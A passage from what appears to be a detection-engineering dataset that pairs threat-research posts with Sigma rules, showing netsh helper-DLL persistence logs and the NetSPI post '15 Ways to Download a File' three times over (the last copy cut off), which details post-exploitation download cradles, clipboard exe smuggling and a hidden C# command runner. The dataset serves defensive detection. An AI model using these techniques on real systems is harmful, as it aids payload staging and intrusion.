LOLBin (Living Off the Land Binary) to execute malicious code.\nTranscription: |\n  13:58:...   WINWORD.EXE     7768    Process Exit            SUCCESS\n  13:58:...   WINWORD.EXE     7412    Process Create  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe    SUCCESS\n  13:58:...   powershell.exe  10776   Process Start           SUCCESS\n  13:58:...   DllHost.exe     9500    Process Create  C:\\Windows\\System32\\conhost.exe    SUCCESS\n  13:58:...   conhost.exe     9500    Process Start           SUCCESS\n  13:58:...   powershell.exe  10776   Process Create  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe    SUCCESS\n  13:58:...   csc.exe         11184   Process Start           SUCCESS\n  13:58:...   powershell.exe  10776   Process Create  C:\\Windows\\SysWOW64\\DllHost.exe    SUCCESS\n  13:58:...   DllHost.exe     8380    Process Start           SUCCESS\n  13:58:...   svchost.exe     8300    Process Create  C:\\Windows\\SysWOW64\\DllHost.exe    SUCCESS\n  13:58:...   svchost.exe     8300    Process Start           SUCCESS\n  13:58:...   DllHost.exe     7668    Process Create  C:\\Program Files (x86)\\Notepad++\\notepad++.exe    SUCCESS\n  13:58:...   Explorer.EXE    7668    Process Start           SUCCESS\n  13:58:...   notepad++.exe   7668    Process Start           SUCCESS\n  \n  Event: Process Start\n  Date: 08-07-2021 13:58:15.2665627\n  Thread: 11184\n  Class: Process\n  Operation: Process Start\n  Result: SUCCESS\n  Path: \n  Duration: 0.0000000\n  \n  Parent PID: 10776\n  Command line: \"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\" /noconfig /fullpaths @\"C:\\Users\\Lunatic0x0\\AppData\\Local\\Temp\\2dv0x0yh.cmdline\"\n  Current directory: C:\\Users\\Lunatic0x0\\Documents\\\n  Environment: \n      allusersprofile=C:\\ProgramData\n```\n\n## LOLBin - netsh.exe\n\n**Tactic: Persistence** \n*Hash: 36b891924e7259d7b517a5f16a108e63aca927da3610b1dcb4dee79a4ccd2223*\n\nNetsh is a command-line scripting utility that allows you to display or modify the network configuration. Netsh also has an option to add helper DLLs to extend functionality of the utility.\n\nWe identified an excel document that called wmic to create a new process of netsh to register the malicious DLL as the helper DLL as shown below (see Figure 8).\n\n```image\nAlt: Figure8\nDescription: The image is a screenshot of a process execution log, detailing the sequence of events related to the execution of the netsh.exe utility. It shows the processes involved, including EXCEL.EXE, wmic.exe, and various system processes, all marked with 'SUCCESS' to indicate successful execution. The Event Properties section highlights the command line used to add a helper DLL to netsh, specifically 'netsh add helper C:\\Users\\Public\\settingsync.dll', indicating a method of persistence utilized by attackers.\nTranscription: |\n  EXCEL.EXE       11832   Process Create   C:\\Windows\\System32\\Wbem\\wmic.exe                SUCCESS\n  wmic.exe        9564    Process Start    C:\\Windows\\System32\\Wbem\\wmic.exe                SUCCESS\n  wmic.exe        9564    Process Create   C:\\Windows\\System32\\Conhost.exe                  SUCCESS\n  Conhost.exe     9564    Process Start    C:\\Windows\\System32\\Conhost.exe                  SUCCESS\n  \n  EXCEL.EXE       11832   Process Create   C:\\Windows\\SYSTEM32\\regsvr32.exe                 SUCCESS\n  regsvr32.exe    7432    Process Start    C:\\Windows\\SYSTEM32\\regsvr32.exe                 SUCCESS\n  regsvr32.exe    7432    Process Exit     C:\\Windows\\system32\\netsh.exe                    SUCCESS\n  winrshost.exe   10520   Process Create   C:\\Windows\\system32\\netsh.exe                    SUCCESS\n  netsh.exe       10520   Process Start    C:\\Windows\\system32\\netsh.exe                    SUCCESS\n  netsh.exe       10520   Process Create   C:\\Windows\\System32\\Conhost.exe                  SUCCESS\n  Conhost.exe     10520   Process Start    C:\\Windows\\System32\\Conhost.exe                  SUCCESS\n  \n  Event Properties\n  Event\n  Date:            28-07-2021 20:10:44.7517743\n  Thread:          880\n  Class:           Process\n  Operation:       Process Start\n  Result:          SUCCESS\n  Path:\n  Duration:        0.0000000\n  \n  Command line:    netsh add helper C:/Users/Public/settingsync.dll\n```\n\nThe path of the DLL is also entered into Windows Registry at `HKLM\\SOFTWARE\\Microsoft\\Netsh`. This allows adversaries to maintain persistence and the execution of the DLL would take place whenever netsh is launched.\n\n## Conclusion\n\nThe Uptycs Threat Research team continues to see an increase in the LOLBins used in various stages of the MITRE ATT&CK framework. As most of these utilities are often used for daily activities, it becomes a challenge for traditional security solutions that do not monitor process behavior.\n\nUptycs’ EDR functionality with suspicious parent/child process relationships, correlation and Threat intelligence provides comprehensive detection and visibility to identify and detect LOLBins malicious activity generically.",
    "sigma_rule": {
      "title": "Hiding Files with Attrib.exe",
      "id": "4281cb20-2994-4580-aa63-c8b86d019934",
      "status": "test",
      "description": "Detects usage of attrib.exe to hide files from users.",
      "references": [
        "https://unit42.paloaltonetworks.com/unit42-sure-ill-take-new-combojack-malware-alters-clipboards-steal-cryptocurrency/",
        "https://www.uptycs.com/blog/lolbins-are-no-laughing-matter"
      ],
      "author": "Sami Ruohonen",
      "date": "2019-01-16",
      "modified": "2023-03-14",
      "tags": [
        "attack.defense-evasion",
        "attack.t1564.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\attrib.exe"
          },
          {
            "OriginalFileName": "ATTRIB.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": " +h "
        },
        "filter_main_msiexec": {
          "CommandLine|contains": "\\desktop.ini "
        },
        "filter_optional_intel": {
          "ParentImage|endswith": "\\cmd.exe",
          "CommandLine": "+R +H +S +A \\\\\\*.cui",
          "ParentCommandLine": "C:\\\\WINDOWS\\\\system32\\\\\\*.bat"
        },
        "condition": "all of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "IgfxCUIService.exe hiding *.cui files via .bat script (attrib.exe a child of cmd.exe and igfxCUIService.exe is the parent of the cmd.exe)",
        "Msiexec.exe hiding desktop.ini"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_attrib_hiding_files.yml",
    "id": "61"
  },
  {
    "url": "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
    "markdown": "# 15 Ways to Download a File\n\n**Network Pentesting | June 16, 2014**\n\n---\n\nPentesters often upload files to compromised boxes to help with privilege escalation, or to maintain a presence on the machine. This blog will cover 15 different ways to move files from your machine to a compromised system. It should be interesting for penetration testers who have a presence on a box and need post-exploitation options, and system admins that just want to move files.\n\nThere are many other ways to move files onto machines during pentests, but this list includes some of my favorites. Below is a summary of the file transfer techniques that will be covered in this blog.\n\n1. PowerShell file download\n2. Visual Basic file download\n3. Perl file download\n4. Python file download\n5. Ruby file download\n6. PHP file download or upload\n7. FTP file download\n8. TFTP file download\n9. Bitsadmin file download\n10. Wget file download\n11. Netcat file download\n12. Windows share file download\n13. Notepad dialog box file download\n14. Exe to Text, Text to EXE with PowerShell and Nishang\n15. Csc.exe to compile from source file\n\n**Note:** Many of the techniques listed should also be considered as options when executing commands through SQL injection. For the multi-line steps, ECHO the commands to a file, and then execute the file.\n\n### 1. PowerShell File Download\n\nPowerShell is one of those scripting languages that can be overlooked as a threat by administrators. However, it can provide a plethora of options and capabilities to someone who knows how to use it. The biggest benefit is that it is native to Windows since Windows Server 2003. Below is an example of a simple script that can be used to download a file to the local file system from a webserver on the internet:\n\n```\n$p = New-Object System.Net.WebClient\n$p.DownloadFile(\"https://domain/file\", \"C:%homepath%file\")\n```\n\nTo execute this script, run the following command in a PowerShell window:\n\n```\nPS C:\\> .\\test.ps1\n```\n\nSometimes, the PowerShell execution policy is set to restricted. In this case, you will not be able to execute commands or scripts through PowerShell… unless you just set it to unrestricted using the following command:\n\n```\nC:\\> powershell set-executionpolicy unrestricted\n```\n\n### 2. Visual Basic File Download\n\nThe final version of Visual Basic has come standard on Windows machines since 1998. The following script can download a file of your choosing. However, the script is quite larger than the PowerShell one.\n\n```\nSet args = Wscript.Arguments\nUrl = \"https://domain/file\"\ndim xHttp: Set xHttp = createobject(\"Microsoft.XMLHTTP\")\ndim bStrm: Set bStrm = createobject(\"Adodb.Stream\")\nxHttp.Open \"GET\", Url, False\nxHttp.Send\nwith bStrm\n    .type = 1\n    .open\n    .write xHttp.responseBody\n    .savetofile \"C:%homepath%file\", 2\nend with\n```\n\nTo execute this script, run the following command in a command shell:\n\n```\nC:\\> cscript test.vbs\n```\n\n### 3. Perl File Download\n\nPerl is an extremely versatile scripting language that can be used for almost anything. Using Perl makes it super easy to download files onto the local host.\n\n```\n#!/usr/bin/perl\nuse LWP::Simple;\ngetstore(\"https://domain/file\", \"file\");\n```\n\nTo execute this script, run the following command in a command shell:\n\n```\nroot@kali:~# perl test.pl\n```\n\n### 4. Python File Download\n\nPython is a general purpose scripting language that emphasizes code readability. As with most scripting languages, the goal is to write less code than needed for a programming language, while still accomplishing the intended task.\n\n```\n#!/usr/bin/python\nimport urllib2\nu = urllib2.urlopen('https://domain/file')\nlocalFile = open('local_file', 'w')\nlocalFile.write(u.read())\nlocalFile.close()\n```\n\nTo execute this script, run the following command in a command shell:\n\n```\nroot@kali:~# python test.py\n```\n\n### 5. Ruby File Download\n\nRuby is an object-oriented programming language that can be used for many things from creating frameworks (think Metasploit) to simple tasks such as downloading files.\n\n```\n#!/usr/bin/ruby\nrequire 'net/http'\nNet::HTTP.start(\"www.domain.com\") do |http|\n    r = http.get(\"/file\")\n    open(\"save_location\", \"wb\") do |file|\n        file.write(r.body)\n    end\nend\n```\n\nTo execute this script, run the following command in a command shell:\n\n```\nroot@kali:~# ruby test.rb\n```\n\n### 6. PHP File Download\n\nPHP is usually a server-side scripting language used for web development, but can also be used as a general purpose scripting language.\n\n```\n#!/usr/bin/php\n<?php\n$data = @file(\"https://example.com/file\");\n$lf = \"local_file\";\n$fh = fopen($lf, 'w');\nfwrite($fh, $data[0]);\nfclose($fh);\n?>\n```\n\nTo execute this script, run the following command in a command shell:\n\n```\nroot@kali:~# php test.php\n```\n\n### 7. FTP File Download\n\nFor this method, an attacker would want to echo the FTP commands to a bash script since it generally requires user interaction to input a username and password. This bash script can then be run to have all the steps ran without the need for interaction.\n\n```\nftp 127.0.0.1 username password get file exit\n```\n\n### 8. TFTP File Download\n\nTrivial FTP comes by default in Windows Vista and below. Note that you will have to set up the corresponding server to connect to. It can be run using the following command:\n\n```\ntftp -i host GET C:%homepath%file location_of_file_on_tftp_server\n```\n\n### 9. Bitsadmin File Download\n\nBitsadmin is a command-line tool for windows that allows a user to create download or upload tasks.\n\n```\nbitsadmin /transfer n https://domain/file c:%homepath%file\n```\n\n### 10. Wget File Download\n\nWget is a Linux and Windows tool that allows for non-interactive downloads.\n\n```\nwget https://example.com/file\n```\n\n### 11. Netcat File Download\n\nNetcat can allow for downloading files by connecting to a specific listening port that will pass the contents of a file over the connection. Note that this example is Linux specific.\n\nOn the attacker's computer, type:\n\n```\ncat file | nc -l 1234\n```\n\nThis will print the contents of the file to the local port 1234. Then, whenever someone connects to that port, the contents of the file will be sent to the connecting IP.\n\nThe following command should be run on the machine the attacker is targeting:\n\n```\nnc host_ip 1234 > file\n```\n\n### 12. Windows Share File Download\n\nWindows shares can be mounted to a drive letter, and files can then be copied over by subsequent copy commands.\n\nTo mount a remote drive, type:\n\n```\nnet use x: \\\\127.0.0.1\\share /user:example.com\\userID myPassword\n```\n\n### 13. Notepad Dialog Box File Download\n\nIf you have access (RDP, physical, etc.) to a machine, but your user permissions do not allow you to open a web browser, this is a trick you can use to quickly download a file from a URL or a Universal Naming Convention (UNC) path. This also works well when you are breaking out of a locked-down application being run on a terminal.\n\n1. Open notepad\n2. Go to file – open\n3. In the File Name box near the bottom, type in the full URL path to your file\n\n```image\nAlt: Rg Download File\nDescription: The image displays a Notepad dialog box on a Windows operating system. It shows the 'Open' file dialog with the path field populated by a URL: 'http://en.wikipedia.org/robots.txt'. The dialog box is framed with red lines, highlighting the area where the URL is entered. The interface indicates that this method can be used to download a file when user permissions restrict access to a web browser.\nTranscription: |\n  Untitled - Notepad\n  \n  Open\n  Computer  Local Disk (C:)\n  \n  Organize  New folder\n  \n  Name\n  Date modified\n  Type\n  Size\n  \n  File name: http://en.wikipedia.org/robots.txt\n  \n  Text Documents (*.txt)\n  Encoding: ANSI\n  \n  [Open] [Cancel]\n```\n\nNotepad is kind enough to go out and grab the contents of this file for you.\n\n### 14. Exe to Txt, and Txt to Exe with PowerShell and Nishang\n\nThis is possibly one of my favorite tools to use when trying to move an exe to a machine. Nishang allows you to convert an exe to hex, then reassemble the hex into the original exe using PowerShell. I have seen group policies that do not allow for the transfer of exes through the RDP clipboard. Although it provides basic protection, it (sometimes) still allows the ability to copy text through the clipboard. In this scenario, you would be able to copy across the Nishang PowerShell source to a file on the box and rename the extension to .ps1. The Nishang script you want to copy is TexttoExe.ps1, and it is only 8 lines long. You can download Nishang here.\n\nTo convert the exe to a hex file, type:\n\n```\nPS > .\\ExetoText.ps1 evil.exe evil.txt\n```\n\nOpen the evil.txt file and copy the contents. Then paste the contents to the target machine using the RDP clipboard. Do the same with the contents of the TexttoExe.ps1 file in Nishang.\n\nTo convert the hex file back to an exe, type:\n\n```\nPS > .\\TexttoExe.ps1 evil.txt evil.exe\n```\n\nThis will result in your evil exe being successfully moved to the target machine.\n\n### 15. Csc.exe to Compile Source from a File\n\nC sharp compiler (csc) is the command line compiler included with Microsoft .NET installations within Windows. This could be useful if you are unable to copy over an executable file, but can still copy over text. Using this method, combined with SQL injection, can move an exe to a box without having to try to bypass egress filters or authenticated proxies that might block outbound connectivity.\n\nThe default location for this executable is the following:\n\n```\nC:\\Windows\\Microsoft.NET\\Framework\\version\n```\n\nUsing the following example code, the compiled executable will use cmd.exe to query the local users on the box and write the results to a file in the C:\\Temp directory. This could obviously be modified to interact with different exe’s on the box, or completely re-written to use your own exploit code.\n\n```\npublic class Evil {\n    public static void Main() {\n        System.Diagnostics.Process process = new System.Diagnostics.Process();\n        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();\n        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;\n        startInfo.FileName = \"cmd.exe\";\n        startInfo.Arguments = \"/C net users > C:\\\\Temp\\\\users.txt\";\n        process.StartInfo = startInfo;\n        process.Start();\n    }\n}\n```\n\nTo compile your source code, type:\n\n```\ncsc.exe /out:C:\\evil.exe C:\\evil.cs\n```\n\n---\n\nHopefully this blog has given you viable options for getting your files (malicious or otherwise) over to a server.",
    "sigma_rule": {
      "title": "Suspicious Download From Direct IP Via Bitsadmin",
      "id": "99c840f2-2012-46fd-9141-c761987550ef",
      "related": [
        {
          "id": "90f138c1-f578-4ac3-8c49-eecfd847c8b7",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects usage of bitsadmin downloading a file using an URL that contains an IP",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2023-02-15",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197",
        "attack.s0190",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_flags": {
          "CommandLine|contains": [
            " /transfer ",
            " /create ",
            " /addfile "
          ]
        },
        "selection_extension": {
          "CommandLine|contains": [
            "://1",
            "://2",
            "://3",
            "://4",
            "://5",
            "://6",
            "://7",
            "://8",
            "://9"
          ]
        },
        "filter_seven_zip": {
          "CommandLine|contains": "://7-"
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_download_direct_ip.yml",
    "id": "66"
  },
  {
    "url": "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
    "markdown": "# 15 Ways to Download a File\n\n**Network Pentesting | June 16, 2014**\n\n---\n\nPentesters often upload files to compromised boxes to help with privilege escalation, or to maintain a presence on the machine. This blog will cover 15 different ways to move files from your machine to a compromised system. It should be interesting for penetration testers who have a presence on a box and need post-exploitation options, and system admins that just want to move files.\n\nThere are many other ways to move files onto machines during pentests, but this list includes some of my favorites. Below is a summary of the file transfer techniques that will be covered in this blog.\n\n1. PowerShell file download\n2. Visual Basic file download\n3. Perl file download\n4. Python file download\n5. Ruby file download\n6. PHP file download or upload\n7. FTP file download\n8. TFTP file download\n9. Bitsadmin file download\n10. Wget file download\n11. Netcat file download\n12. Windows share file download\n13. Notepad dialog box file download\n14. Exe to Text, Text to EXE with PowerShell and Nishang\n15. Csc.exe to compile from source file\n\n**Note:** Many of the techniques listed should also be considered as options when executing commands through SQL injection. For the multi-line steps, ECHO the commands to a file, and then execute the file.\n\n### 1. PowerShell File Download\n\nPowerShell is one of those scripting languages that can be overlooked as a threat by administrators. However, it can provide a plethora of options and capabilities to someone who knows how to use it. The biggest benefit is that it is native to Windows since Windows Server 2003. Below is an example of a simple script that can be used to download a file to the local file system from a webserver on the internet:\n\n```\n$p = New-Object System.Net.WebClient\n$p.DownloadFile(\"https://domain/file\", \"C:%homepath%file\")\n```\n\nTo execute this script, run the following command in a PowerShell window:\n\n```\nPS C:\\> .\\test.ps1\n```\n\nSometimes, the PowerShell execution policy is set to restricted. In this case, you will not be able to execute commands or scripts through PowerShell… unless you just set it to unrestricted using the following command:\n\n```\nC:\\> powershell set-executionpolicy unrestricted\n```\n\n### 2. Visual Basic File Download\n\nThe final version of Visual Basic has come standard on Windows machines since 1998. The following script can download a file of your choosing. However, the script is quite larger than the PowerShell one.\n\n```\nSet args = Wscript.Arguments\nUrl = \"https://domain/file\"\ndim xHttp: Set xHttp = createobject(\"Microsoft.XMLHTTP\")\ndim bStrm: Set bStrm = createobject(\"Adodb.Stream\")\nxHttp.Open \"GET\", Url, False\nxHttp.Send\nwith bStrm\n    .type = 1\n    .open\n    .write xHttp.responseBody\n    .savetofile \"C:%homepath%file\", 2\nend with\n```\n\nTo execute this script, run the following command in a command shell:\n\n```\nC:\\> cscript test.vbs\n```\n\n### 3. Perl File Download\n\nPerl is an extremely versatile scripting language that can be used for almost anything. Using Perl makes it super easy to download files onto the local host.\n\n```\n#!/usr/bin/perl\nuse LWP::Simple;\ngetstore(\"https://domain/file\", \"file\");\n```\n\nTo execute this script, run the following command in a command shell:\n\n```\nroot@kali:~# perl test.pl\n```\n\n### 4. Python File Download\n\nPython is a general purpose scripting language that emphasizes code readability. As with most scripting languages, the goal is to write less code than needed for a programming language, while still accomplishing the intended task.\n\n```\n#!/usr/bin/python\nimport urllib2\nu = urllib2.urlopen('https://domain/file')\nlocalFile = open('local_file', 'w')\nlocalFile.write(u.read())\nlocalFile.close()\n```\n\nTo execute this script, run the following command in a command shell:\n\n```\nroot@kali:~# python test.py\n```\n\n### 5. Ruby File Download\n\nRuby is an object-oriented programming language that can be used for many things from creating frameworks (think Metasploit) to simple tasks such as downloading files.\n\n```\n#!/usr/bin/ruby\nrequire 'net/http'\nNet::HTTP.start(\"www.domain.com\") do |http|\n    r = http.get(\"/file\")\n    open(\"save_location\", \"wb\") do |file|\n        file.write(r.body)\n    end\nend\n```\n\nTo execute this script, run the following command in a command shell:\n\n```\nroot@kali:~# ruby test.rb\n```\n\n### 6. PHP File Download\n\nPHP is usually a server-side scripting language used for web development, but can also be used as a general purpose scripting language.\n\n```\n#!/usr/bin/php\n<?php\n$data = @file(\"https://example.com/file\");\n$lf = \"local_file\";\n$fh = fopen($lf, 'w');\nfwrite($fh, $data[0]);\nfclose($fh);\n?>\n```\n\nTo execute this script, run the following command in a command shell:\n\n```\nroot@kali:~# php test.php\n```\n\n### 7. FTP File Download\n\nFor this method, an attacker would want to echo the FTP commands to a bash script since it generally requires user interaction to input a username and password. This bash script can then be run to have all the steps ran without the need for interaction.\n\n```\nftp 127.0.0.1 username password get file exit\n```\n\n### 8. TFTP File Download\n\nTrivial FTP comes by default in Windows Vista and below. Note that you will have to set up the corresponding server to connect to. It can be run using the following command:\n\n```\ntftp -i host GET C:%homepath%file location_of_file_on_tftp_server\n```\n\n### 9. Bitsadmin File Download\n\nBitsadmin is a command-line tool for windows that allows a user to create download or upload tasks.\n\n```\nbitsadmin /transfer n https://domain/file c:%homepath%file\n```\n\n### 10. Wget File Download\n\nWget is a Linux and Windows tool that allows for non-interactive downloads.\n\n```\nwget https://example.com/file\n```\n\n### 11. Netcat File Download\n\nNetcat can allow for downloading files by connecting to a specific listening port that will pass the contents of a file over the connection. Note that this example is Linux specific.\n\nOn the attacker's computer, type:\n\n```\ncat file | nc -l 1234\n```\n\nThis will print the contents of the file to the local port 1234. Then, whenever someone connects to that port, the contents of the file will be sent to the connecting IP.\n\nThe following command should be run on the machine the attacker is targeting:\n\n```\nnc host_ip 1234 > file\n```\n\n### 12. Windows Share File Download\n\nWindows shares can be mounted to a drive letter, and files can then be copied over by subsequent copy commands.\n\nTo mount a remote drive, type:\n\n```\nnet use x: \\\\127.0.0.1\\share /user:example.com\\userID myPassword\n```\n\n### 13. Notepad Dialog Box File Download\n\nIf you have access (RDP, physical, etc.) to a machine, but your user permissions do not allow you to open a web browser, this is a trick you can use to quickly download a file from a URL or a Universal Naming Convention (UNC) path. This also works well when you are breaking out of a locked-down application being run on a terminal.\n\n1. Open notepad\n2. Go to file – open\n3. In the File Name box near the bottom, type in the full URL path to your file\n\n```image\nAlt: Rg Download File\nDescription: The image displays a Notepad dialog box on a Windows operating system. It shows the 'Open' file dialog with the path field populated by a URL: 'http://en.wikipedia.org/robots.txt'. The dialog box is framed with red lines, highlighting the area where the URL is entered. The interface indicates that this method can be used to download a file when user permissions restrict access to a web browser.\nTranscription: |\n  Untitled - Notepad\n  \n  Open\n  Computer  Local Disk (C:)\n  \n  Organize  New folder\n  \n  Name\n  Date modified\n  Type\n  Size\n  \n  File name: http://en.wikipedia.org/robots.txt\n  \n  Text Documents (*.txt)\n  Encoding: ANSI\n  \n  [Open] [Cancel]\n```\n\nNotepad is kind enough to go out and grab the contents of this file for you.\n\n### 14. Exe to Txt, and Txt to Exe with PowerShell and Nishang\n\nThis is possibly one of my favorite tools to use when trying to move an exe to a machine. Nishang allows you to convert an exe to hex, then reassemble the hex into the original exe using PowerShell. I have seen group policies that do not allow for the transfer of exes through the RDP clipboard. Although it provides basic protection, it (sometimes) still allows the ability to copy text through the clipboard. In this scenario, you would be able to copy across the Nishang PowerShell source to a file on the box and rename the extension to .ps1. The Nishang script you want to copy is TexttoExe.ps1, and it is only 8 lines long. You can download Nishang here.\n\nTo convert the exe to a hex file, type:\n\n```\nPS > .\\ExetoText.ps1 evil.exe evil.txt\n```\n\nOpen the evil.txt file and copy the contents. Then paste the contents to the target machine using the RDP clipboard. Do the same with the contents of the TexttoExe.ps1 file in Nishang.\n\nTo convert the hex file back to an exe, type:\n\n```\nPS > .\\TexttoExe.ps1 evil.txt evil.exe\n```\n\nThis will result in your evil exe being successfully moved to the target machine.\n\n### 15. Csc.exe to Compile Source from a File\n\nC sharp compiler (csc) is the command line compiler included with Microsoft .NET installations within Windows. This could be useful if you are unable to copy over an executable file, but can still copy over text. Using this method, combined with SQL injection, can move an exe to a box without having to try to bypass egress filters or authenticated proxies that might block outbound connectivity.\n\nThe default location for this executable is the following:\n\n```\nC:\\Windows\\Microsoft.NET\\Framework\\version\n```\n\nUsing the following example code, the compiled executable will use cmd.exe to query the local users on the box and write the results to a file in the C:\\Temp directory. This could obviously be modified to interact with different exe’s on the box, or completely re-written to use your own exploit code.\n\n```\npublic class Evil {\n    public static void Main() {\n        System.Diagnostics.Process process = new System.Diagnostics.Process();\n        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();\n        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;\n        startInfo.FileName = \"cmd.exe\";\n        startInfo.Arguments = \"/C net users > C:\\\\Temp\\\\users.txt\";\n        process.StartInfo = startInfo;\n        process.Start();\n    }\n}\n```\n\nTo compile your source code, type:\n\n```\ncsc.exe /out:C:\\evil.exe C:\\evil.cs\n```\n\n---\n\nHopefully this blog has given you viable options for getting your files (malicious or otherwise) over to a server.",
    "sigma_rule": {
      "title": "File Download Via Bitsadmin To A Suspicious Target Folder",
      "id": "2ddef153-167b-4e89-86b6-757a9e65dcac",
      "status": "test",
      "description": "Detects usage of bitsadmin downloading a file to a suspicious target folder",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2023-05-30",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197",
        "attack.s0190",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_flags": {
          "CommandLine|contains": [
            " /transfer ",
            " /create ",
            " /addfile "
          ]
        },
        "selection_folder": {
          "CommandLine|contains": [
            ":\\Perflogs",
            ":\\ProgramData\\",
            ":\\Temp\\",
            ":\\Users\\Public\\",
            ":\\Windows\\",
            "\\AppData\\Local\\Temp\\",
            "\\AppData\\Roaming\\",
            "\\Desktop\\",
            "%ProgramData%",
            "%public%"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_download_susp_targetfolder.yml",
    "id": "70"
  },
  {
    "url": "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
    "markdown": "# 15 Ways to Download a File\n\n**Network Pentesting | June 16, 2014**\n\n---\n\nPentesters often upload files to compromised boxes to help with privilege escalation, or to maintain a presence on the machine. This blog will cover 15 different ways to move files from your machine to a compromised system. It should be interesting for penetration testers who have a presence on a box and need post-exploitation options, and system admins that just want to move files.\n\nThere are many other ways to move files onto machines during pentests, but this list includes some of my favorites. Below is a summary of the file transfer techniques that will be covered in this blog.\n\n1. PowerShell file download\n2. Visual Basic file download\n3. Perl file download\n4. Python file download\n5. Ruby file download\n6. PHP file download or upload\n7. FTP file download\n8. TFTP file download\n9. Bitsadmin file download\n10. Wget file download\n11. Netcat file download\n12. Windows share file download\n13. Notepad dialog box file download\n14. Exe to Text, Text to EXE with PowerShell and Nishang\n15. Csc.exe to compile from source file\n\n**Note:** Many of the techniques listed should also be considered as options when executing commands through SQL injection. For the multi-line steps, ECHO the commands to a file, and then execute the file.\n\n### 1. PowerShell File Download\n\nPowerShell is one of those scripting languages that can be overlooked as a threat by administrators. However, it can provide a plethora of options and capabilities to someone who knows how to use it. The biggest benefit is that it is native to Windows since Windows Server 2003. Below is an example of a simple script that can be used to download a file to the local file system from a webserver on the internet:\n\n```\n$p = New-Object System.Net.WebClient\n$p.DownloadFile(\"https://domain/file\", \"C:%homepath%file\")\n```\n\nTo execute this script, run the following command in a PowerShell window:\n\n```\nPS C:\\> .\\test.ps1\n```\n\nSometimes, the PowerShell execution policy is set to restricted. In this case, you will not be able to execute commands or scripts through PowerShell… unless you just set it to unrestricted using the following command:\n\n```\nC:\\> powershell set-executionpolicy unrestricted\n```\n\n### 2. Visual Basic File Download\n\nThe final version of Visual Basic has come standard on Windows machines since 1998. The following script can download a file of your choosing. However, the script is quite larger than the PowerShell one.\n\n```\nSet args = Wscript.Arguments\nUrl = \"https://domain/file\"\ndim xHttp: Set xHttp = createobject(\"Microsoft.XMLHTTP\")\ndim bStrm: Set bStrm = createobject(\"Adodb.Stream\")\nxHttp.Open \"GET\", Url, False\nxHttp.Send\nwith bStrm\n    .type = 1\n    .open\n    .write xHttp.responseBody\n    .savetofile \"C:%homepath%file\", 2\nend with\n```\n\nTo execute this script, run the following command in a command shell:\n\n```\nC:\\> cscript test.vbs\n```\n\n### 3. Perl File Download\n\nPerl is an extremely versatile scripting language that can be used for almost anything. Using Perl makes it super easy to download files onto the local host.\n\n```\n#!/usr/bin/perl\nuse LWP::Simple;\ngetstore(\"https://domain/file\", \"file\");\n```\n\nTo execute this script, run the following command in a command shell:\n\n```\nroot@kali:~# perl test.pl\n```\n\n### 4. Python File Download\n\nPython is a general purpose scripting language that emphasizes code readability. As with most scripting languages, the goal is to write less code than needed for a programming language, while still accomplishing the intended task.\n\n```\n#!/usr/bin/python\nimport urllib2\nu = urllib2.urlopen('https://domain/file')\nlocalFile = open('local_file', 'w')\nlocalFile.write(u.read())\nlocalFile.close()\n```\n\nTo execute this script, run the following command in a command shell:\n\n```\nroot@kali:~# python test.py\n```\n\n### 5. Ruby File Download\n\nRuby is an object-oriented programming language that can be used for many things from creating frameworks (think Metasploit) to simple tasks such as downloading files.\n\n```\n#!/usr/bin/ruby\nrequire 'net/http'\nNet::HTTP.start(\"www.domain.com\") do |http|\n    r = http.get(\"/file\")\n    open(\"save_location\", \"wb\") do |file|\n        file.write(r.body)\n    end\nend\n```\n\nTo execute this script, run the following command in a command 